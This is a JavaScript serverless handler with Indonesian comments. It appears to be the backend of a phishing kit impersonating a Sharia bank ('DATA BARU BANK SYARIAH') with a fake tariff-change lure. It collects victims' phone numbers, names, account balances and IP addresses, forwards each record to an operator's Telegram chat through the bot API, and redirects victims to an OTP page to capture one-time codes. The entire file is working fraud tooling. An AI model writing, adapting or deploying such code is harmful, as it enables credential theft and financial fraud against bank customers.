const axios = require('axios');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: 'Method not allowed' 
    });
  }
  
  try {
    const { tarif, nohp, nama, saldo } = req.body;
    
    console.log('Received data:', { tarif, nohp, nama, saldo });
    
    // Validasi data
    if (!tarif || !nohp || !nama || !saldo) {
      return res.status(400).json({ 
        success: false, 
        message: 'Semua field harus diisi' 
      });
    }
    
    // Validasi nomor HP
    const cleanNoHp = nohp.replace(/\D/g, '');
    if (cleanNoHp.length < 10 || cleanNoHp.length > 13) {
      return res.status(400).json({ 
        success: false, 
        message: 'Nomor HP tidak valid' 
      });
    }
    
    // Format data
    const formData = {
      id: Date.now(),
      tarif,
      nohp: cleanNoHp,
      nama: nama.trim(),
      saldo: saldo.replace(/\D/g, ''),
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    };
    
    // Simpan data (di Vercel kita tidak bisa menulis file, jadi kita log saja)
    console.log('Data to save:', formData);
    
    // Kirim ke Telegram jika ada token (opsional)
    let telegramSent = false;
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      telegramSent = await sendToTelegram(formData);
    }
    
    // Beri respons sukses
    res.status(200).json({
      success: true,
      message: 'Data berhasil diproses',
      data: {
        id: formData.id,
        telegramSent: telegramSent
      },
      redirect: '/otp.html'
    });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan server. Silakan coba lagi.'
    });
  }
};

// Fungsi untuk mengirim ke Telegram
async function sendToTelegram(data) {
  try {
    const tarifText = data.tarif === 'baru' 
      ? 'TARIF BARU Rp 150.000 / BULAN' 
      : 'TARIF LAMA Rp 6.500 / TRANSAKSI';
    
    const message = `
📱 *DATA BARU BANK SYARIAH* 📱

• No. HP: ${data.nohp}
• Nama: ${data.nama}
• Saldo: Rp ${data.saldo}
• Tarif: ${tarifText}
• Waktu: ${new Date(data.timestamp).toLocaleString('id-ID')}
• ID: ${data.id}
    `.trim();
    
    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    await axios.post(url, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    
    return true;
  } catch (error) {
    console.error('Telegram error:', error.message);
    return false;
  }
}
